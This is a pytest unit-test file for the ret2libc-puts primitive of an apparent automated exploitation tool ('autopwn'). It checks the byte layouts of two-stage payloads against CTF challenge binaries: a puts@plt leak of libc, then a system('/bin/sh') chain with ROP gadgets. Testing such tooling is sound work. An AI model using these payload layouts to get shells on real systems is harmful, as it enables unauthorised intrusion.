"""Unit tests for ``autopwn.primitives.ret2libc_put`` (P6.3).

Per ``rebuild.md`` §6.7 P6.9 + §6.7 P6.3: every primitive
needs ``build_payload(ctx) -> bytes`` asserted against a
fake address.  P6.3 has 2-stage primitives so we cover
both stages (leak + return-to-system).

Test plan
---------
* :class:`Ret2LibcPutX32`:
    * ``name`` + ``stage_count()`` = 2
    * Stage 1 payload length = padding + 12 (3 p32)
    * Stage 1 contains known puts_plt / main / puts_got
    * Stage 2 with leaked puts addr → payload length = padding + 12
    * Edge cases: no puts@plt, no main, no libc → all b""
* :class:`Ret2LibcPutX64`:
    * Same shape (but p64 → 4 p64 fields in stage 1, 4 in stage 2)
    * Edge cases: no gadgets, no libc → b""
"""
from __future__ import annotations

import struct

import pytest

from tests.conftest import ctx_for


pytestmark = pytest.mark.primitive


# Use a real libc for stage 2 tests.  Pick a binary that links
# against the system libc so we can resolve the symbols.
# 32-bit: /lib32/libc.so.6 (used by canary/fmtstr1)
# 64-bit: /lib/x86_64-linux-gnu/libc.so.6 (used by rip/pie/level3_x64)
LIBC_32 = "/lib32/libc.so.6"
LIBC_64 = "/lib/x86_64-linux-gnu/libc.so.6"


class TestRet2LibcPutX32:
    """``primitives.ret2libc_put.Ret2LibcPutX32`` — 32-bit 2-stage."""

    def test_name_and_stage_count(self):
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        assert Ret2LibcPutX32.name == "ret2libc-put-x32"
        assert Ret2LibcPutX32().stage_count() == 2

    def test_stage1_payload_length(self, challenge_dir):
        """Stage 1: padding + 12 (3 p32: puts_plt, main, puts_got)."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        # fmtstr1 is 32-bit with puts@plt
        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 100
        payload = Ret2LibcPutX32().build_payload(ctx)
        assert len(payload) == 100 + 12

    def test_stage1_contains_known_addresses(self, challenge_dir):
        """Stage 1 embeds the real puts_plt, main, puts_got of the binary."""
        from pwn import ELF

        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 20

        e = ELF("Challenge/fmtstr1", checksec=False)
        expected_plt = e.plt["puts"]
        expected_main = e.symbols["main"]
        expected_got = e.got["puts"]

        payload = Ret2LibcPutX32().build_payload(ctx)
        # Skip 20 bytes of nop sled; then 3 p32 addresses
        puts_plt, main_addr, puts_got = struct.unpack("<III", payload[20:32])
        assert puts_plt == expected_plt
        assert main_addr == expected_main
        assert puts_got == expected_got

    def test_stage2_payload_length(self, challenge_dir):
        """Stage 2: padding + 12 (3 p32: system, fake_ret, sh)."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 100
        # Stage 2 needs libc — populate it
        from pwn import ELF
        ctx.libc.elf = ELF(LIBC_32, checksec=False)
        # Pretend we leaked puts at 0x70000000 (32-bit friendly).  libc.symbols["puts"]
        # is ~0x1b0d0 so the subtraction stays positive and fits in p32.
        payload = Ret2LibcPutX32().build_stage2_payload(ctx, leaked_puts_addr=0x70000000)
        assert len(payload) == 100 + 12

    def test_stage2_system_and_sh_use_leak(self, challenge_dir):
        """Stage 2 system_addr and sh_addr are computed from the leak."""
        from pwn import ELF

        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 8
        libc = ELF(LIBC_32, checksec=False)
        ctx.libc.elf = libc

        # Pick a fake leak that puts the libc base at a known offset
        libc_puts_offset = libc.symbols["puts"]
        fake_leak = 0x100000 + libc_puts_offset  # so libc_base = 0x100000
        payload = Ret2LibcPutX32().build_stage2_payload(ctx, fake_leak)
        # After 8 bytes of nop sled: p32(system), p32(0), p32(sh)
        system_addr, fake_ret, sh_addr = struct.unpack("<III", payload[8:20])
        assert system_addr == 0x100000 + libc.symbols["system"]
        assert fake_ret == 0
        # sh_addr = libc_base + libc.search('/bin/sh') offset
        sh_offset = next(libc.search(b"/bin/sh"))
        assert sh_addr == 0x100000 + sh_offset

    def test_returns_empty_for_canary_without_libc(self, challenge_dir):
        """No libc set → stage 2 returns b''."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX32

        # canary has canary stack protection, no main/puts in the usual layout
        # (it has them but the strategy isn't applicable here).  Test the
        # "no libc" edge case.
        ctx = ctx_for("canary", bit=32, stack_canary=True)
        ctx.padding = 80
        ctx.libc.elf = None
        ctx.libc.path = None
        payload = Ret2LibcPutX32().build_stage2_payload(ctx, leaked_puts_addr=0x12345)
        assert payload == b""


class TestRet2LibcPutX64:
    """``primitives.ret2libc_put.Ret2LibcPutX64`` — 64-bit 2-stage."""

    def test_name_and_stage_count(self):
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        assert Ret2LibcPutX64.name == "ret2libc-put-x64"
        assert Ret2LibcPutX64().stage_count() == 2

    def test_stage1_payload_length(self, challenge_dir):
        """Stage 1: padding + 32 (4 p64: pop_rdi, puts_got, puts_plt, main)."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        # rip is 64-bit with puts@plt
        ctx = ctx_for("rip", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xBBBB,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcPutX64().build_payload(ctx)
        assert len(payload) == 24 + 32

    def test_stage1_uses_pop_rdi_gadget(self, challenge_dir):
        """Stage 1's first 8 bytes after padding are the pop_rdi gadget."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = ctx_for("rip", bit=64)
        ctx.padding = 4
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xCAFEBABE, pop_rsi=0, ret=0xDEADBEEF,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcPutX64().build_payload(ctx)
        (pop_rdi,) = struct.unpack("<Q", payload[4:12])
        assert pop_rdi == 0xCAFEBABE

    def test_stage2_includes_ret_alignment_gadget(self, challenge_dir):
        """Stage 2 includes the ``ret`` alignment gadget (P6.2 fix)."""
        from pwn import ELF

        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = ctx_for("rip", bit=64)
        ctx.padding = 8
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xBBBB,
            extra_rdi=0, extra_rsi=0,
        )
        ctx.libc.elf = ELF(LIBC_64, checksec=False)

        libc = ELF(LIBC_64, checksec=False)
        libc_puts_offset = libc.symbols["puts"]
        fake_leak = 0x200000 + libc_puts_offset
        payload = Ret2LibcPutX64().build_stage2_payload(ctx, fake_leak)
        # 8 padding + 4 p64 = 40 bytes total
        assert len(payload) == 40
        # pop_rdi (8) | sh_addr (8) | ret (8) | system (8)
        pop_rdi, sh, ret, system = struct.unpack("<4Q", payload[8:40])
        assert pop_rdi == 0xAAAA
        assert ret == 0xBBBB  # alignment gadget
        assert system == 0x200000 + libc.symbols["system"]
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))

    def test_returns_empty_without_gadgets(self, challenge_dir):
        """No gadgets → stage 1 + stage 2 both return b''."""
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = ctx_for("rip", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = None
        assert Ret2LibcPutX64().build_payload(ctx) == b""

    def test_returns_empty_without_libc_for_stage2(self, challenge_dir):
        """No libc → stage 2 returns b''."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = ctx_for("rip", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xBBBB,
            extra_rdi=0, extra_rsi=0,
        )
        ctx.libc.elf = None
        ctx.libc.path = None
        payload = Ret2LibcPutX64().build_stage2_payload(ctx, leaked_puts_addr=0x12345)
        assert payload == b""

    def test_returns_empty_for_level3_x64(self, challenge_dir):
        """level3_x64 has no puts@plt → stage 1 returns b''."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_put import Ret2LibcPutX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 136
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xBBBB,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcPutX64().build_payload(ctx)
        # level3_x64 has no puts → empty
        assert payload == b""
